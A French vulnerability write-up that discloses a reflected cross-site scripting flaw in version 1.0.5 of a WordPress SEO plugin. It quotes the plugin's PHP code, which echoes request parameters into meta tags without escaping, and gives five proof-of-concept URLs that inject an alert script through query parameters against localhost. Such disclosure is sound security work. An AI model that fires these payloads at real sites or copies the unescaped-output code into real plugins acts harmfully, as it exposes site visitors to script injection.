---
title: "Cross-Site Scripting (reflected) dans le plugin Wordpress XYZZY Basic SEO & Analytics"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [XYZZY Basic SEO & Analytics](https://wordpress.org/plugins/xyzzy-basic-seo-analytics/) (slug: `xyzzy-basic-seo-analytics`) se présente de cette façon :

> XYZZY Basic SEO & Analytics es un sencillo y ligero plugin que nos permite integrar Analytics y las funciones básicas de SEO en nuestra web desde la propia interfaz de WordPress.
>
> ¿Qué hace este plugin?
>
> * Agrega un meta box de Herramientas SEO en nuestras entradas, páginas y custom post types
> * Permite ajustar palabras clave y meta descripción base desde el panel de administración
> * Permite agregar nuestro código de Analytics desde el panel de administración
> * Incluye la meta “news_keywords” para la sindicación de Google News
> * Utiliza las imágenes destacadas de nuestros posts para la meta “image”
> * Incluye las etiquetas meta necesarias para redes sociales
 
La version testée est la 1.0.5 qui date d'il y a plus de deux ans.

## La vulnérabilité

Le script `xyzzy-basic-seo.php` inclut différents autres scripts :

```php
// Funciones para registro de estilos                                                                                  
require_once plugin_dir_path(__FILE__) . 'inc/functions/enqueue-styles.php';                                           
                                                                                                                       
// Funciones para el manejo de metadatos                                                                               
require_once plugin_dir_path(__FILE__) . 'inc/functions/admin-meta.php';                                               
                                                                                                                       
// Funciones para insertar metadatos en head                                                                           
require_once plugin_dir_path(__FILE__) . 'inc/functions/head-embed.php';                                               
                                                                                                                       
// Funciones para el menú de administración                                                                            
require_once plugin_dir_path(__FILE__) . 'inc/functions/admin-menu.php';
```

Ici, c'est le `head-embed.php` qui nous intéresse.

```php
// Función para hacer set de los datos en el header                                                                    
function xbs_set_metadata() {                                                                                          
                                                                                                                       
    global $wp;                                                                                                        
                                                                                                                       
    $id             = get_the_ID();                                                                                    
    $title          = xbs_get_the_title();                                                                             
    $name           = get_bloginfo('name');                                                                            
    $description    = xbs_get_description($id);                                                                        
    $keywords       = xbs_get_keywords($id);                                                                           
    $image          = xbs_get_post_img($id);                                                                           
    $url            = home_url(add_query_arg(array($_GET), $wp->request));                                             
    $analytics      = xbs_get_analytics();                                                                             
                                                                                                                       
    $html = xbs_delete_meta();                                                                                         
                                                                                                                       
    $html .= '<!-- XYZZY Basic SEO meta tags -->';                                                                     
                                                                                                                       
                                                                                                                       
    if (!current_theme_supports('title-tag') && !empty($title)):                                                       
        $html .= '<title>' . $title . '</title>';                                                                      
    endif;                                                                                                             
                                                                                                                       
    if(!empty($title)):                                                                                                
        $html .= '<meta property="og:title" content="' . $title .'">';                                                 
    endif;                                                                                                             
                                                                                                                       
    if(!empty($description)):                                                                                          
        $html .= '<meta name="description" content="' . $description . '" />';                                         
        $html .= '<meta property="og:description" content="' . $description . '">';                                    
    endif;                                                                                                             
                                                                                                                       
    if(!empty($keywords)):                                                                                             
        $html .= '<meta name="keywords" content="' . $keywords . '" />';                                               
        $html .= '<meta name="news_keywords" content="' . $keywords . '" />';                                          
    endif;                                                                                                             
                                                                                                                       
    if(!empty($image)):                                                                                                
        $html .= '<meta property="og:image" content="' . $image . '">';                                                
        $html .= '<meta name="twitter:card" content="summary_large_image">';                                           
    endif;                                                                                                             
                                                                                                                       
    if(!empty($url)):                                                                                                  
        $html .= '<meta property="og:url" content="' . $url . '">';                                                    
    endif;
    
    if(!empty($name)):                                                                                                 
        $html .= '<meta property="og:site_name" content="' . $name . '">';                                             
    endif;                                                                                                             
                                                                                                                       
    if(!empty($analytics)):                                                                                            
        $html .= $analytics;                                                                                           
    endif;                                                                                                             
                                                                                                                       
    $html .= '<!-- End XYZZY Basic SEO meta tags -->';                                                                 
                                                                                                                       
    echo $html;                                                                                                        
}
add_action( 'wp_head' ,'xbs_set_metadata');
```

Une bonne partie des données récupérées ici sont affichées telles quelles dans les tags méta.

Par conséquence, on peut obtenir un XSS via différents paramètres :

```
http://localhost:8000/?page_id=%22%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E
http://localhost:8000/?p=%22%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E
http://localhost:8000/?replytocom=%22%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E
http://localhost:8000/?cat=%22%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E
http://localhost:8000/?tag=%22%3E%3CScRiPt%3Ealert%28%2FXSS%2F%29%3C%2FsCrIpT%3E
```
